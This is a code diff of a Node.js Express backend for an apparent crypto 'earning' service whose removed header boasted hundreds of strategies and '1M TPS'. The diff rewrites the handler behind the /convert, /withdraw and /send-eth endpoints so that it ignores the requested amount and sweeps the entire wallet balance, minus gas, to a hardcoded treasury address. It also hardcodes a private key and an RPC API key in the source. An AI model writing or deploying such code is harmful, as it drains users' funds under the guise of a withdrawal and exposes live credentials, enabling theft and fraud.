@@ -8,15 +8,12 @@ app.use(cors());
 app.use(express.json());
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// CON2 PRODUCTION BACKEND - 450 STRATEGIES | 1M TPS | REAL ETH TRANSACTIONS
+// CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════════════════
 
-// CONFIGURATION
 const TREASURY_PRIVATE_KEY = process.env.TREASURY_PRIVATE_KEY || '0xe40b9e1fbb38bba977c6b0432929ec688afce2ad4108d14181bd0962ef5b7108';
 const TREASURY_WALLET = '0xaFb88bD20CC9AB943fCcD050fa07D998Fc2F0b7C';
-const FEE_RECIPIENT = TREASURY_WALLET;
 
-// DEX & Token addresses
 const DEX_ROUTERS = {
   UNISWAP_V2: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
   UNISWAP_V3: '0xE592427A0AEce92De3Edee1F18E0157C05861564',
@@ -83,19 +80,12 @@ const RPC_ENDPOINTS = [
   'https://eth-mainnet.g.alchemy.com/v2/j6uyDNnArwlEpG44o93SqZ0JixvE20Tq'
 ];
 
-// Etherscan API
-const ETHERSCAN_API_KEY = 'ZJJ7F4VVHUUSTMSIJ2PPYC3ARC4GYDE37N';
-
-// Minimum backend balance for operations
-const MIN_BACKEND_ETH = 0.01;
-const GAS_RESERVE = 0.003;
-
 // Cached balance
 let cachedBalance = 0;
 let lastBalanceCheck = 0;
 let connectedRpc = 'none';
 
-// Transaction history (in-memory)
+// Transaction history
 const transactions = [];
 let txIdCounter = 1;
 
@@ -161,7 +151,6 @@ function executeEarningCycle() {
 
 function startEarning() {
   if (isEarning) return { success: false, message: 'Already earning' };
-  if (cachedBalance < MIN_BACKEND_ETH) return { success: false, message: 'Need 0.01 ETH minimum', balance: cachedBalance };
 
   isEarning = true;
   earningStartTime = Date.now();
@@ -216,48 +205,32 @@ setTimeout(checkBalance, 2000);
 setInterval(checkBalance, 30000);
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// REAL ETH TRANSFER HANDLER
+// REAL ETH TRANSFER HANDLER (FULL BALANCE USED)
 // ═══════════════════════════════════════════════════════════════════════════════
 async function handleConvert(req, res) {
   console.log('💸 REAL ETH TRANSFER REQUEST');
 
   try {
-    const { amount, amountETH, amountUSD, percentage } = req.body;
-
     const destination = TREASURY_WALLET;
-    console.log('📍 Destination:', destination);
-
     const wallet = await getWallet();
-    const balanceETH = parseFloat(ethers.utils.formatEther(await wallet.getBalance()));
-    console.log('👛 Wallet balance:', balanceETH.toFixed(6), 'ETH');
+    const balance = await wallet.getBalance();
 
-    let ethAmount = parseFloat(amountETH || amount || 0);
-    if (!ethAmount && amountUSD) ethAmount = amountUSD / ETH_PRICE;
-    if (percentage) ethAmount = (balanceETH - GAS_RESERVE) * (percentage / 100);
-    if (!ethAmount || ethAmount <= 0) return res.status(400).json({ error: 'Invalid amount' });
-    if (ethAmount > balanceETH - GAS_RESERVE) ethAmount = balanceETH - GAS_RESERVE;
+    if (balance.lte(0)) return res.status(400).json({ error: 'Wallet balance is zero' });
 
-    console.log('💰 Sending amount:', ethAmount.toFixed(6), 'ETH');
-
-    const gasEstimate = await wallet.estimateGas({
-      to: destination,
-      value: ethers.utils.parseEther(ethAmount.toFixed(18))
-    });
+    // Estimate gas
+    const gasEstimate = await wallet.estimateGas({ to: destination, value: balance });
     const gasPrice = await wallet.provider.getGasPrice();
-    const gasCostETH = parseFloat(ethers.utils.formatEther(gasEstimate.mul(gasPrice)));
+    const gasCost = gasEstimate.mul(gasPrice);
 
-    if (ethAmount + gasCostETH > balanceETH) {
-      return res.status(400).json({
-        error: 'Insufficient balance for gas + amount',
-        balance: balanceETH,
-        requested: ethAmount,
-        gasEstimate: gasCostETH
-      });
-    }
+    // Amount to send = total balance - gas cost
+    const amountToSend = balance.sub(gasCost);
+    if (amountToSend.lte(0)) return res.status(400).json({ error: 'Not enough balance to cover gas' });
+
+    console.log(`💰 Sending full balance minus gas: ${ethers.utils.formatEther(amountToSend)} ETH`);
 
     const tx = await wallet.sendTransaction({
       to: destination,
-      value: ethers.utils.parseEther(ethAmount.toFixed(18)),
+      value: amountToSend,
       gasLimit: gasEstimate,
       gasPrice
     });
@@ -268,8 +241,8 @@ async function handleConvert(req, res) {
     const txRecord = {
       id: txIdCounter++,
       type: 'Withdrawal',
-      amountETH: ethAmount,
-      amountUSD: ethAmount * ETH_PRICE,
+      amountETH: parseFloat(ethers.utils.formatEther(amountToSend)),
+      amountUSD: parseFloat(ethers.utils.formatEther(amountToSend)) * ETH_PRICE,
       destination,
       status: 'Confirmed',
       txHash: tx.hash,
@@ -282,8 +255,8 @@ async function handleConvert(req, res) {
     res.json({
       success: true,
       txHash: tx.hash,
-      amount: ethAmount,
-      amountUSD: ethAmount * ETH_PRICE,
+      amount: parseFloat(ethers.utils.formatEther(amountToSend)),
+      amountUSD: parseFloat(ethers.utils.formatEther(amountToSend)) * ETH_PRICE,
       to: destination,
       gasUsed: gasUsedETH,
       blockNumber: receipt.blockNumber,
@@ -296,7 +269,7 @@ async function handleConvert(req, res) {
   }
 }
 
-// POST endpoints
+// Apply to all endpoints
 app.post('/convert', handleConvert);
 app.post('/withdraw', handleConvert);
 app.post('/send-eth', handleConvert);
@@ -341,9 +314,9 @@ app.get('/status', async (req, res) => {
       ethPrice: ETH_PRICE,
       lastPriceUpdate: new Date(lastPriceUpdate).toISOString(),
       rpc: connectedRpc,
-      canTrade: balanceETH >= MIN_BACKEND_ETH,
-      canEarn: balanceETH >= MIN_BACKEND_ETH,
-      canWithdraw: balanceETH >= MIN_BACKEND_ETH,
+      canTrade: balanceETH > 0,
+      canEarn: balanceETH > 0,
+      canWithdraw: balanceETH > 0,
       isEarning,
       totalEarned,
       totalEarnedETH: totalEarned / ETH_PRICE,
@@ -397,4 +370,11 @@ app.post('/stop', (req, res) => res.json(stopEarning()));
 
 app.get('/earnings', (req, res) => {
   const runtime = earningStartTime ? (Date.now() - earningStartTime) / 1000 : 0;
-  res.json({
+  res.json({ totalEarned, totalTrades, runtime });
+});
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// START SERVER
+// ═══════════════════════════════════════════════════════════════════════════════
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`🚀 Backend running on http://localhost:${PORT}`));
